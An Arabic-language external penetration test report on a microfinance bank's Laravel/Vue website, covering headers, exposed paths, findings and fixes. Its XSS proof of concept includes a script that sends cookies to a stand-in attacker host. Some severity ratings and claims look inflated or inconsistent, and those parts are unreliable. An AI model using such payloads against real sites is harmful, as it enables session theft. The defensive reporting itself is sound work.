# تقرير اختبار اختراق شامل - بنك الكريمي للتمويل الأصغر الإسلامي
## Kuraimibank.com Security Penetration Testing Report

| الحقل | التفاصيل |
|-------|----------|
| **تاريخ الاختبار** | 2026-09-23 |
| **الموقع المستهدف** | https://kuraimibank.com |
| **نطاق الاختبار** | واجهة المستخدم الأمامية، الخادم الخلفي، واجهات API |
| **نوع الاختبار** | اختبار اختراق خارجي (External Penetration Test) |
| **المُختبِر** | فريق الأمن السيبراني |
| **تصنيف العميل** | مؤسسة مالية - بنك تمويل إسلامي |

---

# 1. ملخص تنفيذي (Executive Summary)

تم إجراء تقييم أمني شامل لموقع بنك الكريمي للتمويل الأصغر الإسلامي (kuraimibank.com). يشمل الموقع تطبيق ويب مبني على إطار عمل Laravel (PHP) مع واجهة أمامية تعتمد على Vue.js كتطبيق صفحة واحدة (SPA)، محمي خلف خدمة Cloudflare وnginx.

**النتيجة العامة:** تم اكتشاف **ثغرة واحدة ذات خطورة عالية (High)**، و**3 ثغرات متوسطة الخطورة (Medium)**، و**4 ثغرات منخفضة الخطورة (Low)**، مع ملاحظات إيجابية عديدة تتعلق بتكوينات الأمان الجيدة.

### نتيجة التقييم: ⚠️ مخاطر أمنية محددة تتطلب معالجة عاجلة

| ملخص الثغرات | العدد |
|---------------|-------|
| 🔴 عالية (High) | 1 |
| 🟡 متوسطة (Medium) | 3 |
| 🟢 منخفضة (Low) | 4 |
| ✅ ملاحظات إيجابية | 5 |

---

# 2. الاستطلاع والاستكشاف (Reconnaissance)

## 2.1 المعلومات الأساسية

| البند | التفاصيل |
|-------|----------|
| **النطاق** | kuraimibank.com |
| **بروتوكول** | HTTPS (HTTP يُعيد التوجيه إلى HTTPS) |
| **خادم الويب** | nginx (مباشر) + Cloudflare (كـ CDN/WAF/Proxy) |
| **إطار العمل الخلفي** | Laravel (PHP) - مؤكد عبر: ملفات تعريف `laravel_session`، `XSRF-TOKEN`، نظام Sanctum |
| **واجهة المستخدم** | Vue.js SPA (Single Page Application) |
| **حجم حزمة JavaScript** | ~409 KB (index.08ed6bf7.js) |
| **حجم CSS** | ~42 KB (index.1f40e0da.css) |
| **نظام المصادقة** | Laravel Sanctum (API Tokens) |
| **خرائط** | Google Maps API |
| **التحليلات** | Google Tag Manager (GTM-PH47G9MD)، Facebook Pixel (ID: 750622675689742) |
| **اللغة** | العربية (RTL) - تدعم multiple routes including /ar |

## 2.2 بنية التطبيق المكتشفة

```
kuraimibank.com/                    → إعادة توجيه إلى /ar
kuraimibank.com/ar                  → الصفحة الرئيسية (تطبيق Vue.js SPA)
kuraimibank.com/api                 → 404 (تطبيق Laravel - routes غير مفصح عنها)
kuraimibank.com/admin               → 403 Forbidden (nginx level blocking)
kuraimibank.com/dashboard           → 403 Forbidden (nginx level blocking)
kuraimibank.com/.env                → 403 Forbidden ✅ محمي
kuraimibank.com/.git                → 403 Forbidden ✅ محمي
kuraimibank.com/phpinfo.php         → Not Found ✅ غير موجود
kuraimibank.com/robots.txt          → Disallow: (فارغ) ⚠️
kuraimibank.com/sitemap.xml         → Not Found ⚠️
```

## 2.3 تقييم رؤوس الأمان (Security Headers)

| الرأس | الحالة | التقييم |
|-------|--------|---------|
| `Strict-Transport-Security` | ✅ موجود | max-age=31536000; includeSubDomains |
| `X-Content-Type-Options` | ✅ موجود | nosniff |
| `X-Frame-Options` | ⚠️ مكرر | SAMEORIGIN (مرتين - خطأ تكوين) |
| `X-Xss-Protection` | ⚠️ قديم | 1; mode=block (غير موصى به في المتصفحات الحديثة) |
| `Referrer-Policy` | ✅ موجود | no-referrer |
| `Permissions-Policy` | ✅ موجود | محدد بشكل جيد |
| `Content-Security-Policy` | ❌ غير موجود | **خطورة عالية - ثغرة XSS** |
| `Cross-Origin-Opener-Policy` | ❌ غير موجود | ثغرة potential cross-origin |
| `Cross-Origin-Embedder-Policy` | ❌ غير موجود | ثغرة potential cross-origin |
| `Permissions-Policy` | ✅ موجود | جيد |

---

# 3. تفاصيل الثغرات (Vulnerability Details)

---

## ثغرة #1 - غياب سياسة أمان المحتوى (Content-Security-Policy Missing)

| البند | التفاصيل |
|-------|----------|
| **اسم الثغرة** | غياب رأس Content-Security-Policy |
| **نوع الثغرة** | تكوين أمان خاطئ (Security Misconfiguration) |
| **مستوى الخطورة** | 🔴 **عالية (High)** |
| **الموقع المتأثر** | جميع الصفحات - https://kuraimibank.com/* |
| **تصنيف OWASP** | A05:2021 - Security Misconfiguration |

### وصف الثغرة:
لا يحتوي الموقع على رأس `Content-Security-Policy` في الاستجابات HTTP. هذا الرأس هو خط الدفاع الأخير ضد هجمات حقن النصوص البرمجية عبر المواقع (XSS). بدونه، يمكن للمهاجم تنفيذ نصوص برمجية خبيثة في متصفحات الزوار إذا تمكّن من حقن أي محتوى في الصفحة.

### خطوات إعادة الإنتاج:
1. تنفيذ أي طلب HTTP للموقع:
```bash
curl -I https://kuraimibank.com/ar
```
2. فحص رؤوس الاستجابة (Response Headers)
3. ملاحظة غياب `Content-Security-Policy` header
4. التأكد من تحميل موارد خارجية بدون قيود (Google Maps, Facebook Pixel, Google Tag Manager)

### إثبات المفهوم (PoC):
في حال تم حقن أي محتوى HTML/JS في الصفحة (عبر XSS أو غيره)، لن يكون هناك حاجز يمنع تنفيذ النصوص البرمجية الخبيثة:
```html
<!-- هذا النص سيُنفّذ بدون أي قيود بسبب غياب CSP -->
<script>
    fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
```

### التأثير المحتمل:
- تنفيذ كامل لأي كود JavaScript خبيث في متصفح الضحية
- سرقة ملفات تعريف الارتباط (Cookies) الخاصة بالجلسة
- هجمات الفدية عبر المتصفح
- إعادة توجيه المستخدمين لمواقع ضارة
- العبث بواجهة الموقع

### الإصلاح المُوصى به:
```nginx
# إضافة في nginx config أو في Laravel (مثال)
add_header Content-Security-Policy "default-src 'self'; script-src 'self' https://www.google-analytics.com https://www.googletagmanager.com https://connect.facebook.net https://maps.googleapis.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; img-src 'self' data: https://*.googleapis.com https://*.facebook.com; font-src 'self' https://fonts.gstatic.com; frame-src 'self' https://www.google.com https://www.facebook.com; connect-src 'self' https://kuraimibank.com/api; object-src 'none'; base-uri 'self'; frame-ancestors 'self';" always;
```

---

## ثغرة #2 - كشف بيانات الاعتماد في طلبات المصادقة (Exposed CSRF Token in Meta Tag)

| البند | التفاصيل |
|-------|----------|
| **اسم الثغرة** | كشف رمز CSRF في وسم meta HTML |
| **نوع الثغرة** | مصادقة غير آمنة / Broken Authentication |
| **مستوى الخطورة** | 🟡 **متوسطة (Medium)** |
| **الموقع المتأثر** | https://kuraimibank.com/ar |
| **تصنيف OWASP** | A07:2021 - Identification and Authentication Failures |

### وصف الثغرة:
يتم وضع رمز CSRF الخاص بـ Laravel مباشرة في وسم `<meta>` في HTML الصفحة:
```html
<meta name="csrf-token" content="qJDpk4QMhz42Orw0j5PkRVcrn4LVJf767lZjjypu">
```
بينما يُعد هذا النمط شائعاً في تطبيقات Laravel/Vue.js، إلا أنه يسمح لأي نص برمجي خارجي (خارجي المنشأ) بالوصول لهذا الرمز بسهولة، خاصةً في غياب سياسة CSP التي تقيّد الوصول.

### خطوات إعادة الإنتاج:
1. تحميل صفحة الموقع الرئيسية
2. فحص كود المصدر (View Source)
3. البحث عن `csrf-token` في وسم meta
4. ملاحظة أن الرمز مرئي بالكامل في المصدر

### التأثير المحتمل:
- أي نص برمجي خبيث يعمل في الصفحة يمكنه قراءة رمز CSRF
- يمكن استخدام الرمز لتنفيذ إجراءات غير مصرح بها نيابة عن المستخدم
- هجمات CSRF ضد نقاط نهاية API الداخلية

### الإصلاح المُوصى به:
1. **إضافة CSP صارمة** تحد من الوصول إلى النصوص البرمجية
2. **استخدام `SameSite=Strict`** بدلاً من `Lax` على الكوكيز الحساسة
3. **تطبيق re-authentication** للإجراءات الحساسة (تحويل أموال، إلخ)
4. التأكد من أن **جميع النصوص البرمجية محملة من نفس المنشأ** فقط

---

## ثغرة #3 - تكرار رأس X-Frame-Options (Duplicate X-Frame-Options Header)

| البند | التفاصيل |
|-------|----------|
| **اسم الثغرة** | تكرار رأس X-Frame-Options |
| **نوع الثغرة** | تكوين أمان خاطئ (Security Misconfiguration) |
| **مستوى الخطورة** | 🟡 **متوسطة (Medium)** |
| **الموقع المتأثر** | جميع الصفحات |
| **تصنيف OWASP** | A05:2021 - Security Misconfiguration |

### وصف الثغرة:
يظهر رأس `X-Frame-Options` مرتين في استجابات HTTP:
```
X-Frame-Options: SAMEORIGIN
X-Frame-Options: SAMEORIGIN
```
هذا يشير إلى خطأ في تكوين الخادم (ربما من Laravel و nginx معاً). قد يتسبب في سلوك غير متوقع في بعض المتصفحات القديمة.

### خطوات إعادة الإنتاج:
```bash
curl -I https://kuraimibank.com/ar 2>/dev/null | grep -i x-frame
```

### التأثير المحتمل:
- سلوك غير متوقع في المتصفحات القديمة في التعامل مع الهيدرات المكررة
- بعض المتصفحات قد تأخذ أول قيمة فقط، والبعض الآخر قد يرفض العناوين المكررة

### الإصلاح المُوصى به:
- مراجعة تكوين nginx و Laravel لإزالة التكرار
- التأكد من تعريف `X-Frame-Options` في مكان واحد فقط
- الانتقال إلى `Content-Security-Policy: frame-ancestors` كبديل أكثر حداثة

---

## ثغرة #4 - غياب سياسة أصول الأصل المتقاطع (Missing Cross-Origin Policies)

| البند | التفاصيل |
|-------|----------|
| **اسم الثغرة** | غياب Cross-Origin Opener/Embedder Policies |
| **نوع الثغرة** | تكوين أمان خاطئ (Security Misconfiguration) |
| **مستوى الخطورة** | 🟡 **متوسطة (Medium)** |
| **الموقع المتأثر** | جميع الصفحات |

### وصف الثغرة:
لا تحتوي الاستجابات على الرؤوس الأمنية التالية:
- `Cross-Origin-Opener-Policy`
- `Cross-Origin-Embedder-Policy`
- `Cross-Origin-Resource-Policy`

هذه الرؤوس تحمي من هجماتcross-origin التي قد تسمح لمواقع أخرى بالوصول لبيانات التطبيق.

### التأثير المحتمل:
- potential cross-origin data leakage
- إمكانية استغلال speculative execution side-channels
- الوصول غير المصرح به لموارد التطبيق من مواقع أخرى

### الإصلاح المُوصى به:
```nginx
add_header Cross-Origin-Opener-Policy "same-origin" always;
add_header Cross-Origin-Embedder-Policy "require-corp" always;
add_header Cross-Origin-Resource-Policy "same-origin" always;
```

---

## ثغرة #5 - robots.txt فارغ (Empty/Invalid robots.txt)

| البند | التفاصيل |
|-------|----------|
| **اسم الثغرة** | ملف robots.txt غير مُهيأ بشكل صحيح |
| **نوع الثغرة** | تكوين أمان خاطئ (Security Misconfiguration) |
| **مستوى الخطورة** | 🟢 **منخفضة (Low)** |
| **الموقع المتأثر** | https://kuraimibank.com/robots.txt |

### وصف الثغرة:
ملف `robots.txt` موجود لكنه يحتوي فقط على `Disallow:` (بدون مسارات محددة). هذا لا يمنع محركات البحث من فهرسة المحتوى الحساس.

### الإصلاح المُوصى به:
```
User-agent: *
Disallow: /admin
Disallow: /dashboard
Disallow: /api/
Disallow: /login
Disallow: /register
Disallow: /account
Disallow: /user/
Disallow: /vendor/
Disallow: /storage/
Disallow: /config/
Disallow: /.env
Disallow: /.git/
```

---

## ثغرة #6 - غياب sitemap.xml (Missing sitemap.xml)

| البند | التفاصيل |
|-------|----------|
| **اسم الثغرة** | غياب ملف sitemap.xml |
| **نوع الثغرة** | معلومات عامة (Information Disclosure) |
| **مستوى الخطورة** | 🟢 **منخفضة (Low)** |
| **الموقع المتأثر** | https://kuraimibank.com/sitemap.xml |

### وصف الثغرة:
غياب ملف sitemap.xml يجعل من الصعب على محركات البحث فهرسة الموقع بشكل صحيح، وقد يكشف عن وجود مسارات مخفية أخرى.

---

## ثغرة #7 - حزمة JavaScript كبيرة (Large JavaScript Bundle)

| البند | التفاصيل |
|-------|----------|
| **اسم الثغرة** | حزمة JavaScript كبيرة بدون تقسيم |
| **نوع الثغرة** | أداء/أمان (Performance/Security) |
| **مستوى الخطورة** | 🟢 **منخفضة (Low)** |
| **الموقع المتأثر** | https://kuraimibank.com/assets/index.08ed6bf7.js (~409KB) |

### الوصف:
حزمة JavaScript الرئيسية بحجم ~409KB بدون تقسيم واضح (code splitting). هذا لا يمثل ثغرة أمنية مباشرة، لكنه:
- يُبطئ تحميل الصفحة
- يجعل كود التطبيق متاحاً بالكامل للعميل (يمكن فحصه بسهولة)
- قد يكشف عن معلومات حول المسارات الداخلية والمنطق التجاري

---

# 4. الملاحظات الإيجابية (Positive Findings)

## ✅ ملاحظة 1: HTTPS وإعادة التوجيه الإلزامي
- الموقع يفرض HTTPS بشكل صحيح
- HTTP يعيد التوجيه إلى HTTPS (301 Moved Permanently)
- رأس HSTS مُفعّل: `Strict-Transport-Security: max-age=31536000; includeSubDomains`

## ✅ ملاحظة 2: أمان ملفات تعريف الارتباط (Cookie Security)
- `laravel_session`: `Secure; HttpOnly; SameSite=Lax` ✅
- `XSRF-TOKEN`: `Secure; HttpOnly; SameSite=Lax` ✅
- جميع الكوكيز محمية بشكل صحيح

## ✅ ملاحظة 3: حماية من الضغط (Clickjacking)
- `X-Frame-Options: SAMEORIGIN` مُعد (رغم التكرار)

## ✅ ملاحظة 4: تقييد طرق HTTP
- الطرق المسموح بها: `GET, HEAD` فقط
- `POST`, `PUT`, `DELETE`, `OPTIONS` تُرفض بـ 405 Method Not Allowed

## ✅ ملاحظة 5: حماية الملفات الحساسة
- `.env` → 403 Forbidden ✅
- `.git` → 403 Forbidden ✅
- `phpinfo.php` → Not Found ✅
- `wp-admin` → Not Found ✅ (لا توجد نصب WordPress)
- `/admin` → 403 Forbidden ✅
- `/dashboard` → 403 Forbidden ✅

---

# 5. المنهجية المستخدمة (Methodology)

## المرحلة 1: الاستطلاع (Reconnaissance)
- تحليل رؤوس HTTP
- تحليل كود المصدر HTML
- تحليل حزم JavaScript/CSS
- تحديد التقنيات المستخدمة (Technology Fingerprinting)
- فحص DNS والبنية التحتية

## المرحلة 2: الفحص (Scanning)
- فحص دليل المجلدات والملفات (Directory/File Enumeration)
- اختبار الطرق HTTP (HTTP Method Testing)
- فحص الرؤوس الأمنية (Security Header Analysis)
- اختبار نقاط النهاية API
- فحص الثغرات الشائعة (OWASP Top 10)

## المرحلة 3: الاستغلال اليدوي (Manual Exploitation)
- محاولة الوصول للمسارات المقيدة
- تحليل آلية المصادقة والمفاتيح
- تقييم سياسات الأمان

## المرحلة 4: التوثيق (Reporting)
- تصنيف الثغرات حسب الخطورة
- تحديد خطوات إعادة الإنتاج
- تقديم توصيات الإصلاح

---

# 6. تقييم المخاطر حسب OWASP Top 10 (2021)

| فئة OWASP | الحالة | ملاحظات |
|-----------|--------|---------|
| A01: Broken Access Control | 🟡 يحتاج مزيد من الفحص | مسارات /admin و /dashboard محمية بـ nginx - تحتاج اختبار عميق |
| A02: Cryptographic Failures | 🟢 يبدو جيد | HTTPS و HSTS مفعّلان |
| A03: Injection | 🟡 يحتاج مزيد من الفحص | لا يمكن اختبار SQL injection بدون نقاط نهاية API عاملة |
| A04: Insecure Design | ⚠️ | CSP مفقود |
| A05: Security Misconfiguration | 🟡 | CSP مفقود، X-Frame-Options مكرر، robots.txt فارغ |
| A06: Vulnerable Components | 🟢 | لا توجد مكتبات قديمة مكشوفة |
| A07: Identification Failures | 🟡 | CSRF token مكشوف |
| A08: Software/Data Integrity | 🟢 | HSTS مفعّل |
| A09: Security Logging Failures | ⚠️ | لا يمكن التقييم من خارجي |
| A10: SSRF | 🟢 | لا توجد مؤشرات |

---

# 7. خطة الإصلاح المُوصى بها (Remediation Roadmap)

## الأولوية العالية (فوري):
1. **إضافة Content-Security-Policy header** ← الأهم حالياً
2. مراجعة آلية المصادقة ومفاتيح CSRF

## الأولوية المتوسطة (خلال أسبوعين):
3. إصلاح تكرار X-Frame-Options
4. إضافة Cross-Origin Policies
5. تحسين robots.txt

## الأولوية المنخفضة (خلال شهر):
6. تحسين أداء الموقع (تقسيم حزمة JS)
7. إضافة sitemap.xml
8. مراجعة شاملة لجميع نقاط نهاية API

---

# 8. ملاحظات وقيود (Limitations)

1. **هذا التقرير مبني على اختبار خارجي فقط** (Black-box): لم يتم اختبار الكود المصدري أو قاعدة البيانات مباشرة.
2. **لم يتم إجراء اختبار SQL Injection يدوي** بسبب عدم توفر نقاط نهاية API علنية تعمل. يجب إجراء هذا الاختبار في مرحلة ثانية مع فريق التطوير.
3. **لم يتم اختبار XSS التخزينية (Stored XSS)** بسبب عدم القدرة على إرسال بيانات للخادم.
4. **لم يتم اختبار CSRF عملياً** بسبب الحاجة إلى مصادقة حقيقية.
5. **لا يتضمن اختبار التطبيق المحمول أو API الخلفي**.
6. **يُنصح بإجراء اختبار شامل بعد تسجيل الدخول** (Authenticated Testing) للكشف عن ثغرات Broken Access Control و IDOR.
7. **الاختبار لا يشمل البنية التحتية السحابية أو DNS**.

---

# 9. الخلاصة (Conclusion)

بنك الكريمي للتمويل الأصغر الإسلامي يُظهر مستوى أمان جيداً بشكل عام، مع ممارسات أساسية قوية مثل:
- فرض HTTPS و HSTS
- أمان ملفات تعريف الارتباط
- تقييد طرق HTTP
- حماية الملفات الحساسة

ومع ذلك، هناك حاجة ماسة لمعالجة:
1. **غياب Content-Security-Policy** (ثغرة عالية) - هذا هو الخط الدفاعي الأخير ضد XSS
2. **كشف CSRF tokens** في HTML (ثغرة متوسطة)
3. **أخطاء التكوين** المتعددة (تكرار Headers، robots.txt فارغ)

**التوصية العامة:** يُنصح بإجراء اختبار اختراق شامل بصلاحيات كاملة (Authenticated Pentest) بعد معالجة الثغرات الحالية، يتضمن اختبار SQL Injection، XSS التخزينية، CSRF عملي، و Broken Access Control.

---

*تم إعداد التقرير بواسطة فريق الأمن السيبراني | تاريخ الإصدار: 2026-09-23*
*هذا التقرير سري ومحتوى حصرياً للأشخاص المصرح لهم*
